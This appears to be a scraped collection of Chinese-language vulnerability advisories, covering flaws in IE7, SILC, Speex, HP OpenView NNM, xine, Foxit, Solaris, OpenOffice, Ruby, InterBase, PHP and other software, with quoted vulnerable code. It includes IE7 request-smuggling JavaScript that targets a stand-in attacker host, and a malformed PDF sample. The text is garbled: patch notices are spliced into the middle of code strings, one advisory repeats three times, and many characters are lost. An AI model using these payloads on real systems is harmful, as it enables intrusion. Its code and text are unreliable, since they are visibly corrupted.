x.setRequestHeader(\"Content-Length\"+String.fromCharCode(233),\"0\");   x.setRequestHeader(\"Content-Length\"+String.fromCharCode(240)+String.fromCharCode(213),\"0\");- Host   x.setRequestHeader(\"Host\"+String.fromCharCode(223), \"www.microsoft.com\");- Referer   x.setRequestHeader(\"Referer\"+String.fromCharCode(205)+String.fromCharCode(155),\"http://www.referrer.tld\");   x.setRequestHeader(\"Referer\"+String.fromCharCode(237)+String.fromCharCode(155),\"http://www.referrer.tld\");Internet Explorer 7允许在setRequestHeader中设置Transfer Encoding: chunked头，导致Http请求拆分/渗透漏洞。假设存在反射跨站脚本漏洞影响的站点与攻击者的站点托管在同一台主机上，且用户没有配置代理，由于IE7允许设置 setRequestHeader(\"Transfer-Encoding\",\"chunked\");因此就允许将POST请求中的负载用作Web服务器的其他请求。例如：-----------------------------------------------------var x=new XMLHttpRequest();for(var i =0; i<1;i++){x.open(\"POST\",\"/\");x.setRequestHeader(\"Transfer-Encoding\",\"chunked\");x.setRequestHeader(\"Proxy-Connection\",\"keep-alive\");x.setRequestHeader(\"Connection\",\"keep-alive\"); x.onreadystatechange=function (){    if (x.readyState == 4){    } }try{x.send(\"0\r\n\r\nPOST / HTTP/1.1\r\nHost:at.tack.er\r\nContent-Length: SOMELENGTH\r\n\r\n\")  }catch(r){} }-----------------------------------------------------请求会变为：----------------------------------------------------POST / HTTP/1.1Accept: */*Accept-Language: itTransfer-Encoding: chunkedConnection: keep-aliveCache-Control: no-cacheReferer: http://vi.ct.im/UA-CPU: x86Accept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;.NET CLR 2.0.50727; .NET CLR 1.1.4322)Host: at.tack.erContent-Length: 670POST /?Send1 HTTP/1.1Host: at.tack.erContent-Length: TheLenghtOfTheNextRequest----------------------------------------------------这样Web服务器就会打开套接字等待负载?      SILC(Secure Internet Live Conferencing)是安全的互联网会议讨论系统，可以发送任何类型的信息，包括多媒体信息，如视频、音频、图像等?SILC处理畸形的数据交换时存在漏洞，远程攻击者可能利用此漏洞控制服务器?如果要初始连接到SILC服务器，对等?客户端、路由器和服务器)之间要执行相互认证并执行密钥协商协议以获得之后用于加密通讯的共享密钥。对等端之间的加密数据是通过以PKCS#1 1.5标准编码的报文交换的?SILC的PKCS1编码功能是在silcpkcs1.c文件的silccrypt库中实现的，用于解码PKCS#1报文的代码在silc_pkcs1_decode函数中实现，如下所示： /-----------   SilcBool silc_pkcs1_decode(SilcPkcs1BlockType bt,   const unsigned char *data,   SilcUInt32 data_len,   unsigned char *dest_data,   SilcUInt32 dest_data_size,   SilcUInt32 *dest_len)   {   int i = 0;   SILC_LOG_DEBUG((\"PKCS#1 decoding, bt %d\", bt));   /* Sanity checks */   if (!data || !dest_data || dest_data_size < 3 ||      data[0] != 0x00 || data[1] != (unsigned char)bt) {    SILC_LOG_DEBUG((\"Malformed block\"));    return FALSE;  }  /* Decode according to block type */  switch (bt) {  case SILC_PKCS1_BT_PRV0:    /* Do nothing */    break;  case SILC_PKCS1_BT_PRV1:    /* Verification */(1) for (i = 2; i < data_len; i++)      if (data[i] != 0xff)    break;    break;  case SILC_PKCS1_BT_PUB:    /* Decryption */(2) for (i = 2; i < data_len; i++)      if (data[i] == 0x00)    break;    break;  }  /* Sanity checks */(3) if (data[i++] != 0x00) {    SILC_LOG_DEBUG((\"Malformed block\"));    return FALSE;  }  if (i - 1 < SILC_PKCS1_MIN_PADDING) {    SILC_LOG_DEBUG((\"Malformed block\"));    return FALSE;  }  if (dest_data_size < data_len - i) {    SILC_LOG_DEBUG((\"Destination buffer too small\"));    return FALSE;  }  /* Copy the data */(4) memcpy(dest_data, data + i, data_len - i);  /* Return data length */  if (dest_len)    *dest_len = data_len - i;  return TRUE;}- -----------/在上面的代码中，如果在传输私?BT_PRIV1)或公开(BT_PUB)密钥材料时有效PKCS#1编码的恶意伪造报文所有位分别设置?xff或非0x00的话，就会导致执行流?1)?2)退出循环，无符整数变量i设置为data_len，然后在(3)同一变量i?递增，因此设置为data_len+1。在(3)传送过滤检查的特制报文最终会由于?4)处memcpy()函数中传送的第三个参数中的整数溢出而导致内存破坏。由于i设置为了datalen+1，用于计算第三个参数值的data_len - i表达式会?1，导致由于符号转换错误而覆盖进程内存。成功利用这个漏洞会导致程序拒绝服务，或以SILC程序的权限执行任意指令?      fishsound库提供一个编程接口，允许使用Xiph.Org codec(FLAC、Speex和Vorbis)编码和解码音频数据?fishsound库所使用的Speex库在处理Speex头时存在数组索引错误，如果特制的Speex流在头中包含有负数的modeID字段的话就可能导致执行任意指令?Speex头中包含?2位的modeID字段，libspeex将其解释为有符的int?spx_int32_t)。正常的使用方法是索引到全局模式列表以检索SpeexMode *?mode = (SpeexMode *)speex_mode_list[modeID];然后创建解码器：st = speex_decoder_init(mode);这会在libspeex中调用speex_decoder_init()，类似于? void *speex_decoder_init(const SpeexMode *mode){ return mode->dec_init(mode);}因此如果没有保证流头中所给出的modeID处于speex_mode_list[]范围中，就会导致执行任意指令。fishsound检查了上边?modeID <SPEEX_NB_MODES)，但没有检查负数值?       HP OpenView网络节点管理?OV NNM)是HP公司开发和维护的网络管理系统软件，具有强大的网络节点管理功能?OV NNM的多个服务和组件中存在目录遍历和拒绝服务漏洞，允许远程攻击者通过提交恶意请求导致服务崩溃或下载任意文件?---------------------------A] CGI目录遍历---------------------------NNM中的CGI使用一些指令过滤掉客户端传送参数中的恶意字符，但这些CGI所过滤掉的路径分隔符为反斜线，因此攻击者可以使用斜线执行目录遍历攻击，从磁盘上下载文件?----------------------------------B] ovalarmsrv拒绝服务----------------------------------如果向监听于2954端口的ovalarmsrv服务发送了不完整的多行请求的话，就会耗尽100%的CPU资源，无法再处理2953?954端口上的资源?25?5?6?7?1请求的最后数字参数用于指定每行中将要发送多少子参数。ovalarmsrv会启动一个循环，在接受到所有子参数后终止这个循环，如果关闭连接或不发送全部或部分上述参数就会导致整个服务僵死。以下为所有支持的请求及其sscanf格式?  REQUEST_CONTRIB_EVENTS  (22): \"%d %d 目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接?a href=\"http://support.openview.hp.com/selfsolve/patches\" target=\"_blank\" rel=\"nofollow\">http://support.openview.hp.com/selfsolve/patches</a>\"  REQUEST_PRINT           (25): \"%d %d %d %d \"  REQUEST_DETAILS         (33): \"%d %d \"  REQUEST_EVENT_DELETE    (35): \"%d %d \"  REQUEST_EVENT_ACK       (36): \"%d %d \"  REQUEST_RUN_ACTION      (37): \"%d %d  \"  REQUEST_SPECDATA        (41):  REQUEST_EVENT_UNACK     (44): \"%d %d \"  REQUEST_SAVE            (45): \"%d %d %d %d \"  REQUEST_CAT_CHANGE      (46): \"%d %d %d %[^\n]\"  REQUEST_SEV_CHANGE      (47): \"%d %d %d %[^\n]\"  REQUEST_CONF_ACTIONS    (48): \"%d %d\n\"  REQUEST_RESTORE_STATE   (62): \"%d %[^\n]\"  REQUEST_SAVE_DIR        (63):  REQUEST_LOCALE          (66): \"%d\"  REQUEST_FORMAT_PRINT    (81): \"%d %d %d %d \"  REQUEST_CONF_RUN_ACTION (??): \"%d %d %d %[^\n]\"-----------------------------C] ovalarmsrv空指针引?-----------------------------上文所述的用于指定子参数数量的参数也用于分配一定数量的初始动态内?参数?* 2)以存储所有的子参数，如果指定了过大的无法分配的子参数数量就会触发空指针引用，导致服务崩溃?---------------------------------D] ovtopmd进程终止---------------------------------监听?532端口上的ovtopmd服务使用特定类型的报?0x36)来强制终止进?Exiting due to request of ovtopmd -k.)，因此攻击者可以使用这种报文导致拒绝服务?      HP OpenView网络节点管理?OV NNM)是HP公司开发和维护的网络管理系统软件，具有强大的网络节点管理功能?OV NNM的多个服务和组件中存在目录遍历和拒绝服务漏洞，允许远程攻击者通过提交恶意请求导致服务崩溃或下载任意文件?---------------------------A] CGI目录遍历---------------------------NNM中的CGI使用一些指令过滤掉客户端传送参数中的恶意字符，但这些CGI所过滤掉的路径分隔符为反斜线，因此攻击者可以使用斜线执行目录遍历攻击，从磁盘上下载文件?----------------------------------B] ovalarmsrv拒绝服务----------------------------------如果向监听于2954端口的ovalarmsrv服务发送了不完整的多行请求的话，就会耗尽100%的CPU资源，无法再处理2953?954端口上的资源?25?5?6?7?1请求的最后数字参数用于指定每行中将要发送多少子参数。ovalarmsrv会启动一个循环，在接受到所有子参数后终止这个循环，如果关闭连接或不发送全部或部分上述参数就会导致整个服务僵死。以下为所有支持的请求及其sscanf格式?  REQUEST_CONTRIB_EVENTS  (22): \"%d %d 目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接?a href=\"http://support.openview.hp.com/selfsolve/patches\" target=\"_blank\" rel=\"nofollow\">http://support.openview.hp.com/selfsolve/patches</a>\"  REQUEST_PRINT           (25): \"%d %d %d %d \"  REQUEST_DETAILS         (33): \"%d %d \"  REQUEST_EVENT_DELETE    (35): \"%d %d \"  REQUEST_EVENT_ACK       (36): \"%d %d \"  REQUEST_RUN_ACTION      (37): \"%d %d  \"  REQUEST_SPECDATA        (41):  REQUEST_EVENT_UNACK     (44): \"%d %d \"  REQUEST_SAVE            (45): \"%d %d %d %d \"  REQUEST_CAT_CHANGE      (46): \"%d %d %d %[^\n]\"  REQUEST_SEV_CHANGE      (47): \"%d %d %d %[^\n]\"  REQUEST_CONF_ACTIONS    (48): \"%d %d\n\"  REQUEST_RESTORE_STATE   (62): \"%d %[^\n]\"  REQUEST_SAVE_DIR        (63):  REQUEST_LOCALE          (66): \"%d\"  REQUEST_FORMAT_PRINT    (81): \"%d %d %d %d \"  REQUEST_CONF_RUN_ACTION (??): \"%d %d %d %[^\n]\"-----------------------------C] ovalarmsrv空指针引?-----------------------------上文所述的用于指定子参数数量的参数也用于分配一定数量的初始动态内?参数?* 2)以存储所有的子参数，如果指定了过大的无法分配的子参数数量就会触发空指针引用，导致服务崩溃?---------------------------------D] ovtopmd进程终止---------------------------------监听?532端口上的ovtopmd服务使用特定类型的报?0x36)来强制终止进?Exiting due to request of ovtopmd -k.)，因此攻击者可以使用这种报文导致拒绝服务?       HP OpenView网络节点管理?OV NNM)是HP公司开发和维护的网络管理系统软件，具有强大的网络节点管理功能?OV NNM的多个服务和组件中存在目录遍历和拒绝服务漏洞，允许远程攻击者通过提交恶意请求导致服务崩溃或下载任意文件?---------------------------A] CGI目录遍历---------------------------NNM中的CGI使用一些指令过滤掉客户端传送参数中的恶意字符，但这些CGI所过滤掉的路径分隔符为反斜线，因此攻击者可以使用斜线执行目录遍历攻击，从磁盘上下载文件?----------------------------------B] ovalarmsrv拒绝服务----------------------------------如果向监听于2954端口的ovalarmsrv服务发送了不完整的多行请求的话，就会耗尽100%的CPU资源，无法再处理2953?954端口上的资源?25?5?6?7?1请求的最后数字参数用于指定每行中将要发送多少子参数。ovalarmsrv会启动一个循环，在接受到所有子参数后终止这个循环，如果关闭连接或不发送全部或部分上述参数就会导致整个服务僵死。以下为所有支持的请求及其sscanf格式?  REQUEST_CONTRIB_EVENTS  (22): \"%d %d 目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接?a href=\"http://support.openview.hp.com/selfsolve/patches\" target=\"_blank\" rel=\"nofollow\">http://support.openview.hp.com/selfsolve/patches</a>\"  REQUEST_PRINT           (25): \"%d %d %d %d \"  REQUEST_DETAILS         (33): \"%d %d \"  REQUEST_EVENT_DELETE    (35): \"%d %d \"  REQUEST_EVENT_ACK       (36): \"%d %d \"  REQUEST_RUN_ACTION      (37): \"%d %d  \"  REQUEST_SPECDATA        (41):  REQUEST_EVENT_UNACK     (44): \"%d %d \"  REQUEST_SAVE            (45): \"%d %d %d %d \"  REQUEST_CAT_CHANGE      (46): \"%d %d %d %[^\n]\"  REQUEST_SEV_CHANGE      (47): \"%d %d %d %[^\n]\"  REQUEST_CONF_ACTIONS    (48): \"%d %d\n\"  REQUEST_RESTORE_STATE   (62): \"%d %[^\n]\"  REQUEST_SAVE_DIR        (63):  REQUEST_LOCALE          (66): \"%d\"  REQUEST_FORMAT_PRINT    (81): \"%d %d %d %d \"  REQUEST_CONF_RUN_ACTION (??): \"%d %d %d %[^\n]\"-----------------------------C] ovalarmsrv空指针引?-----------------------------上文所述的用于指定子参数数量的参数也用于分配一定数量的初始动态内?参数?* 2)以存储所有的子参数，如果指定了过大的无法分配的子参数数量就会触发空指针引用，导致服务崩溃?---------------------------------D] ovtopmd进程终止---------------------------------监听?532端口上的ovtopmd服务使用特定类型的报?0x36)来强制终止进?Exiting due to request of ovtopmd -k.)，因此攻击者可以使用这种报文导致拒绝服务?       xine是一款免费的媒体播放器，支持多种格式?xine-lib的src/demuxers/demux_nsf.c文件中的demux_nsf_send_chunk()函数没有正确地处理NSF声音格式?open_nsf_file():109: this->title = strdup(&header[0x0E]);demux_nsf_send_chunk():122: char title[100];162: sprintf(title, \"目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://xinehq.de/\" target=\"_blank\" rel=\"nofollow\">http://xinehq.de/</a>, song %d/%d\",            this->title, this->current_song, this->total_songs);如果用户受骗打开了带有超长NSF标题的媒体文件的话，就可以触发栈溢出，导致执行任意指令?      Foxit Reader是一款小型的PDF文档查看器和打印程序?Foxit Reader处理包含有畸?XObject资源的网页时存在漏洞，用户在处理恶意文件时会导致Foxit Reader崩溃?当使用Foxit Reader旋转包含有畸?XObject资源的网页时(或向页面添加?Rotate字段)?4 0 obj<< /Type /Page/Parent 3 0 R/Rotate 170/Contents [ 25 0 R ]/Resources <</ProcSet [ /PDF /Text /ImageB /ImageC ]/XObject <</Im23 23 0 R >>/Font << /TT3 33 0 R   >> >> >> endobj23 0 obj<</Length 11643/Filter/DCTDecode/Width -28986631481/Height 5/BitsPerComponent 8/ColorSpace/DeviceRGB/Type/#6eject/Name/&#141;#4825#6#25n#00       xine是一款免费的媒体播放器，支持多种格式?xine播放器的demux_nfs.c文件中没有正确地验证媒体文件中的copyright字段?line 111:this->copyright = strdup(&header[0x4E]);line 189:char copyright[100];line 208:sprintf(copyright, \"(C) 目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://xinehq.de/\" target=\"_blank\" rel=\"nofollow\">http://xinehq.de/</a>\", this->copyright);如果用户受骗打开了带有超长copyright字段的媒体文件的话，就可能触发栈溢出，导致执行任意指令?      通用数据格式(CDF)是由NASA戈达德航天飞行中心开发的用于存储和操控标量和多维数据的数据格式?CDF库在打开无效的CDF输入文件时存在栈溢出漏洞，允许攻击者在使用该库的应用程序环境中执行任意指令或导致整个应用程序崩溃?漏洞存在于src/lib/cdfread64.c文件的以下代码中。Read32s_64函数将数据从文件读取到缓冲区，temp缓冲区大小为MAX_READ32s，但没有检查count参数，因此大于MAX_READ32s的参数可能会触发栈溢出?/-----------57  STATICforIDL Logical Read32s_64 (fp, buffer, count)58  vFILE *fp;59  Int32 *buffer;60  int count;61  {62  #if defined(NETWORKbyteORDERcpu)63    if (count < 1) return TRUE;64    if (!READv64(buffer,(size_t)4,(size_t)count,fp)) return FALSE;65  #else66  #define MAX_READ32s CDF_MAX_DIMS        /* This must be the maximum of67                                             CDF_MAX_DIMS andMAX_VXR_ENTRIES68                                           (and for any other uses of69                                           `Read32s&#039;). */70    int i; Int32 temp[MAX_READ32s];71    if (count < 1) return TRUE;72    if (!READv64(temp,(size_t)4,(size_t)count,fp)) return FALSE;- -----------/ReadGDR64还在src/lib/cdfread64.c调用了Read32s_64函数?-----------256     #if defined(STDARG)257     STATICforIDL CDFstatus ReadGDR64 (vFILE *fp, OFF_T offset, ...)258     #else259     STATICforIDL CDFstatus ReadGDR64 (va_alist)260     va_dcl261     #endif262     {...301           if (!Read32_64(fp,&(fp->GDR64->rNumDims))) return CRE;302           if (!Read32_64(fp,&(fp->GDR64->NzVars))) return CRE;303           if (!Read64_64(fp,&(fp->GDR64->UIRhead))) return CRE;304           if (!Read32_64(fp,&(fp->GDR64->rfuC))) return CRE;305           if (!Read32_64(fp,&(fp->GDR64->rfuD))) return CRE;306           if (!Read32_64(fp,&(fp->GDR64->rfuE))) return CRE;307           if (!Read32s_64(fp,fp->GDR64->rDimSizes,308                          (int)fp->GDR64->rNumDims)) return CRE;- -----------/?07行使用fp->GDR64->rNumDims变量作为count参数调用了有漏洞的函数。由于这个变量是?01行从文件中加载的，因此是可控的?      Solaris是一款由Sun开发和维护的商业性质UNIX操作系统?Solaris的TCP实现中的安全漏洞可能允许远程非特权用户在TCP SYN洪水的情况下导致接受新的网络连接速度变慢，可能无法创建网络连接便已超时。此外，单处理器系统还可能由于高CPU使用率而总体变慢，导致整个系统拒绝服务?这个漏洞影响ndd(1M)可调节值tcp_conn_req_max_q0明显高于默认?024的主机。该值越大，漏洞被利用后对主机的影响越大。如果这个漏洞被利用，控制台中可看到以下消息? WARNING: High TCP connect timeout rate!  System (port <port number>) may be under a SYN flood attack       SAP Internet Transaction Server(ITS)6.20版本中的WGate存在跨站脚本攻击漏洞。远程攻击者可以借助到wgate.dll的~service参数中的\"<>\"序列，和query string中的Javascript粘结，注入任意的web脚本或HTML?       WordNet是普林斯顿大学开发的英语词汇及其词法关系数据库?WordNet的src/wn.c文件的searchwn()函数以及lib/search.c文件的wngrep()函数在处理发送给wn二进制程序的超长字符串参数时存在栈溢出漏洞：else {sprintf(tmpbuf, \"wn: invalid search option: 目前厂商还没有提供补丁或者升级程序，建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://wordnet.princeton.edu/\" target=\"_blank\" rel=\"nofollow\">http://wordnet.princeton.edu/</a>\n\", av[j]);display_message(tmpbuf);errcount++;}远程攻击者可以通过发送带有无效命令行选项的超长字符串请求触发这个溢出，导致拒绝服务的情况?       OpenOffice是个整合性的软件，包含了许多文字处理、表格、公式等办公工具?OpenOffice的rtl_allocateMemory()函数没有执行整数溢出检查便?字节为边界环绕分配请求，以下是sal/rtl/source/alloc_global.c中的漏洞代码?191void * 192SAL_CALL rtl_allocateMemory (sal_Size n)193{194void * p = 0;195if (n > 0)196{197addr;198 size = RTL_MEMORY_ALIGN(n + RTL_MEMALIGN, RTL_MEMALIGN); 199200int index = (size - 1) >> RTL_MEMALIGN_SHIFT;201OSL_ASSERT(RTL_MEMALIGN >= sizeof(sal_Size)); 202203try_alloc: 204if (index < RTL_MEMORY_CACHED_LIMIT >> RTL_MEMALIGN_SHIFT)205addr = (char*)rtl_cache_alloc(g_alloc_table[index]);206else207addr = (char*)rtl_arena_alloc (gp_alloc_arena, &size);208?98行，如果n> UINT_MAX - RTL_MEMALIGN的话n + RTL_MEMALIGN计算就可能溢出，导致在try_alloc分配了不充分的缓冲区，然后将这个缓冲区返回给了调用函数。由于调用函数所认为缓冲区大小比实际大小大得多，因此可能触发堆溢出?       Rantx中的admin.php文件允许远程攻击者通过把logininfo cookie设置成\"<?php\" or \"?>\" 而绕过身份认证和获得而特权。它会在密码文件中呈现出来以及可能审查通过一个对比缺陷?      mtr是结合了traceroute和ping程序的网络诊断工具?mtr的split.c文件的split_redraw()函数在处理特制的主机名时存在栈溢出漏洞，远程攻击者可能利用此漏洞控制用户系统?以下是有漏洞部分的代码段?\"split.c\"#define MAX_LINE_SIZE  256void split_redraw(void){int  max;;int  at;ip_t *addr; *name;newLine[MAX_LINE_SIZE];i;...for(at = 0; at < max; at++) {addr = net_addr(at);if( addrcmp( (void *) addr, (void *) &unspec_addr, af ) != 0 ) {name = dns_lookup(addr);[1]if(name != NULL) {/* May be we should test name&#039;s length */ [!!];sprintf(newLine, \"目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：<a href=\"http://www.bitwizard.nl/mtr\" target=\"_blank\" rel=\"nofollow\">http://www.bitwizard.nl/mtr</a> %d %d %d %d %d %d\", name,[2]net_loss(at),net_returned(at), net_xmit(at),net_best(at) /1000, net_avg(at)/1000,net_worst(at)/1000);} else {...sprintf(newLine, \"???\");}...;...}}在[2]处没有安全的调用sprintf()函数，name参数为IP地址的RevDNS。如果用户受骗访问了恶意的DNS服务器，则在使用-p?-split命令行选项时就会触发这个溢出，导致执行任意指令?      Ruby是一种功能强大的面向对象的脚本语言。Ruby的rb_ary_fill()函数中存在整数溢出漏洞： rb_ary_modify(ary);end = beg + len;if (end < 0) {rb_raise(rb_eArgError, \"argument too big\");}if (end > RARRAY(ary)->len) {if (end >= RARRAY(ary)->aux.capa) {REALLOC_N(RARRAY(ary)->ptr, VALUE, end);RARRAY(ary)->aux.capa = end;}len值由之前的函数递增1，且由用户指定。由于缺少输入检查，可能在以下位置触发整数溢出：REALLOC_N(RARRAY(ary)->ptr, VALUE, end);这个宏会分配end * VALUE。在32位架构上VALUE?，因此如果攻击者指定的值为0x3fffffff的话，宏就会分配0内存区域，在下一次访问ary->ptr的时候就出出现空指针引用?      OneCMS是为网络游戏站点设计的内容管理系统?OneCMS实现上存在输入验证漏洞，远程攻击者可以通过提交恶意的HTTP请求包含本地资源的任意文件，导致泄露敏感信息?当act设置为go的时候，OneCMS的install_mod.php文件中没有正确过滤对load参数的输入便用于包含文件? $mod = $_GET[&#039;load&#039;];$filexp = explode(\".\", $mod);$filetype = $filexp[1]; $file = $filexp[0];$file2 = \"mods/$mod\";if (!is_numeric($mod)) { // makes sure that the user isnt entering a #if ($filetype == \"php\") { if ($_GET[&#039;act&#039;] == \"\") {echo \"Are you sure you would like to install the <b>\".$file.\"</b> module?Yes\"; } if ($_GET[&#039;act&#039;] == \"go\") { include ($file2); ...       BigView是NASA开发的图形查看器，可在运行Linux的桌面PC上将图形拉伸和缩放到任意尺寸?BigView在解析特制的PNM输入文件时存在栈溢出漏洞，攻击者可能利用此漏洞通过诱使用户处理恶意文件控制用户系统?以下是Ppm/ppm.C文件中的漏洞代码。这里getline()函数从文件将数据读取到缓冲区?/-----------418 static void getline(int fin, char* lineBuf, int len)419 {420bool done=false;421int index=0;422lineBuf[index]=&#039;&#039;;423 while(! done){424   lineBuf[index] = getOneChar(fin);425if( lineBuf[index]==10 ) {426lineBuf[index]=0;427done=true;428}429 ++index;430 }431 lineBuf[index]=0;432 }- -----------/函数要求了目标缓冲区的长度，但没有内部使用。在PPM::ppmHeader()函数中使用了上述函数来读取PPM文件的头?/-----------56PPM::ppmHeader(string filename, PPM::Format* format,57int* cpp, int* bpc,58int* sizeX, int* sizeY,59int* imageOffset)60{61std::ostringstream err;62char magic[3],lineBuf[512],junk;63int res,max;...115while( junk == &#039;&#039; ){116getline(fin,lineBuf,512);117cout<< \"Comment:\"<<lineBuf<<\":\"<<endl;118junk = getOneChar(fin);119}- -----------/栈上所分配的lineBuf缓冲区大小为512字节，如果PPM头中包含有大?12字节的行的话，就会触发栈溢出，导致拒绝服务或执行任意指令?      Borland InterBase是跨平台的高性能商业数据库?Borland Interbase数据库在处理发送给默认TCP 3050端口的畸形报文时存在整数溢出漏洞，最终可能导致栈溢出，允许以系统权限执行任意指令?Solaris版本中的漏洞代码段：/-----------inet_accept_connection+0x164: srl %o5, 0x10, %o7inet_accept_connection+0x168: ld[%l0 + 0xcc], %l1inet_accept_connection+0x16c: sth %o7, [%l1 + 8]inet_accept_connection+0x170: ba+0x3a0<inet_accept_connection+0x510>inet_accept_connection+0x174: ld[%fp - 0x8c], %g2inet_accept_connection+0x178: ld[%fp - 0x88], %g3inet_accept_connection+0x17c: add %fp, -0x84, %g2inet_accept_connection+0x180: st%g2, [%fp - 0x90]inet_accept_connection+0x184: ldsb[%g3], %g4inet_accept_connection+0x188: st%g4, [%fp - 0xa0]inet_accept_connection+0x18c: ld[%fp - 0x88], %o5inet_accept_connection+0x190: add %o5, 1, %o7inet_accept_connection+0x194: st%o7, [%fp - 0x88]inet_accept_connection+0x198: ld[%fp - 0xa0], %o4inet_accept_connection+0x19c: st%o4, [%fp - 0x304]inet_accept_connection+0x1a0: ld[%fp - 0x304], %l0inet_accept_connection+0x1a4: st%l0, [%fp - 0x308]inet_accept_connection+0x1a8: ld[%fp - 0x308], %l1inet_accept_connection+0x1ac: cmp %l1, 0inet_accept_connection+0x1b0: be,a+0x50<inet_accept_connection+0x200>inet_accept_connection+0x1b4: clr %g2.- -----------/在加载以下报文的有符字节时会出现整数溢出?/-----------inet_accept_connection+0x184: ldsb[%g3], %g4g4 = 0xffffff80- -----------/然后将溢出g4的值移到l3用作计数器：/-----------inet_accept_connection+0x1b8: ld[%fp - 0x88], %g2inet_accept_connection+0x1bc: ld[%fp - 0x90], %g4inet_accept_connection+0x1c0: ldsb[%g2], %g3*inet_accept_connection+0x1c4: stb %g3, [%g4]**inet_accept_connection+0x1c8: ld[%fp - 0xa0], %l1inet_accept_connection+0x1cc: ld[%fp - 0x88], %o4inet_accept_connection+0x1d0: sub %l1, 1, %l2inet_accept_connection+0x1d4: st%l2, [%fp - 0xa0]inet_accept_connection+0x1d8: add %o4, 1, %o5inet_accept_connection+0x1dc: st%o5, [%fp - 0x88]inet_accept_connection+0x1e0: ld[%fp - 0xa0], %l3inet_accept_connection+0x1e4: cmp %l3, 0 ***inet_accept_connection+0x1e8: ld[%fp - 0x90], %o7inet_accept_connection+0x1ec: add %o7, 1, %l0inet_accept_connection+0x1f0: st%l0, [%fp - 0x90]inet_accept_connection+0x1f4: bne,a -0x38<inet_accept_connection+0x1bc>* g3指向报文字节** 将报文字节拷贝到g4所指向的栈地址*** 循环直至l3 = 0- -----------/对于Windows版本，以下位置出现整数溢出：/-----------0040F6050FBE11MOVSX EDX,BYTE PTR DS:[ECX]- -----------/这里将报文数据拷贝到栈：/-----------0040F62C880AMOV BYTE PTR DS:[EDX],CL- -----------/在栈中源字符串指针后跟随0x40字节大小缓冲区：/-----------00ECF6CC 000000000ECF6D0 0000000000ECF6D4 0000000000ECF6D8 0000000000ECF6DC 0000000000ECF6E0 0000000000ECF6E40000000000ECF6E80000000000ECF6EC 0000000000ECF6F0 0000000000ECF6F4 0000000000ECF6F80000000000ECF6FC 0000000000ECF700 0000000000ECF7040000000000ECF708 0000000000ECF70C00A9636D** 源字符串指针       Motion是用于监控网络摄像头的视频信号及图片变化的程序?Motion的webhttpd守护程序中存在单字节溢出漏洞，远程攻击者可能利用此漏洞控制服务器?以下是webhttpd.c中的漏洞代码?1950 static int read_client(int client_socket, void *userdata, char *auth)....1954char buffer[1024] = {&#039;\0&#039;};int length = 1024; .... 1963 int nread = 0, readb = -1; 19641965 nread = read (client_socket, buffer, length);19661967 if (nread <= 0) {1968 motion_log(LOG_ERR, 1, \"httpd First read\"); 1969pthread_mutex_unlock(&httpd_mutex); 1970return -1; 1971 }1972 else {1973char method[sizeof (buffer)];1974char url[sizeof (buffer)];1975char protocol[sizeof (buffer)];1976char *authentication=NULL;19771978buffer[nread] = &#039;\0&#039;;该函数从客户端读取HTTP请求，如果客户端发送了大于等于1024字节的HTTP请求的话?978行就会向缓冲区多些出一个字节?远程攻击者可以通过向Motion的HTTP控制接口发送超长请求导致用0字节覆盖栈缓冲区?       PHP是广泛使用的通用目的脚本语言，特别适合于Web开发，可嵌入到HTML中?PHP的chdir()和ftok()函数中存在多个绕过safe_mode限制漏洞?在chdir()函数中： - ---PHP_FUNCTION(chdir){char *str;int ret, str_len;if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, \"s\", &str,&str_len) == FAILURE) {RETURN_FALSE;}if ((PG(safe_mode) && !php_checkuid(str, NULL,CHECKUID_CHECK_FILE_AND_DIR)) || php_check_open_basedir(str TSRMLS_CC)){RETURN_FALSE;}ret = VCWD_CHDIR(str);if (ret != 0) {php_error_docref(NULL TSRMLS_CC, E_WARNING, \"目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：<a href=\"http://www.php.net\" target=\"_blank\" rel=\"nofollow\">http://www.php.net</a> (errno %d)\",strerror(errno), errno);RETURN_FALSE;}RETURN_TRUE;}- ---safe_mode检查了str，例如：- ---Warning: chdir(): SAFE MODE Restriction in effect. The script whose uidis 80 is not allowed to access / owned by uid 0 in /www/mb/mb.php online 8- ---用户可以在当前目录中创建http:子目录，因此可以创建http://../../../../../../ ?TRUE==((PG(safe_mode) && !php_checkuid(str, NULL,CHECKUID_CHECK_FILE_AND_DIR)) || php_check_open_basedir(strTSRMLS_CC)))对于str=\"http://../../../../../../\" ，safe_mode会忽略所有带有http:// 的目录?ftok()函数中也存在类似的漏洞?      Solaris是一款由Sun开发和维护的商业性质UNIX操作系统?Solaris的内核没有正确的处理SIOCSIPMSFILTER IOCTL请求，本地攻击者可以利用这个漏洞以内核级权限执行任意指令?以下是inet/ip/ip_multi.c中的漏洞代码?static int ip_set_srcfilter(conn_t *connp, struct group_filter *gf, struct ip_msfilter *imsf, ipaddr_t grp, ipif_t *ipif,  boolean_t isv4mapped) { [...]  int i, err, insrcs, infmode, new_fmode; <-- [1] [...]  insrcs = imsf->imsf_numsrc; <-- [2] [...]  /* Make sure we can handle the source list */ if (insrcs > MAX_FILTER_SIZE) <-- [3]  return (ENOBUFS); [...]  fp->sl_numsrc = insrcs; <-- [4] ilg->ilg_filter = fp; <-- [5] [...]  l_copy(ilg->ilg_filter, new_filter);<-- [6] [...] 在[2]处将用户所提供的imsf->imsf_numsrc值分配给了insrcs，imsf->imsf_numsrc变量为无符int型，而insrcs为有符int型。如果用户所提供的imsf->imsf_numsrc值为很大的整数的话，insrcs就可能成为负值?在netinet/in.h文件中： struct ip_msfilter {  struct in_addr imsf_multiaddr;  struct in_addr imsf_interface;  uint32_t imsf_fmode;  uint32_t imsf_numsrc; <-- [7]  struct in_addr imsf_slist[1];  }; 当insrcs为负值的时候，就可以绕过[3]处的检查，之后用户所提供的数据用作了ilg->ilg_filter的?请见[4]和[5])，而ilgilg_filter值会用作l_copy的参?请见[6])，这就会由于l_copy中的越界写操作而导致内核内存破坏?      